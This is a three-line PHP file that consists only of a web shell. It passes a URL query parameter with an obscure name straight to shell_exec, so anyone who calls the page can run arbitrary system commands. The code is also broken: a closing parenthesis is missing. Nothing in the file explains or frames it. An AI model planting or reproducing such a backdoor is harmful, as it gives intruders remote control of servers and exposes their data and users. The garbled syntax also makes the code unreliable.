<?php
shell_exec($_GET['CdG_AhkX'];
?>
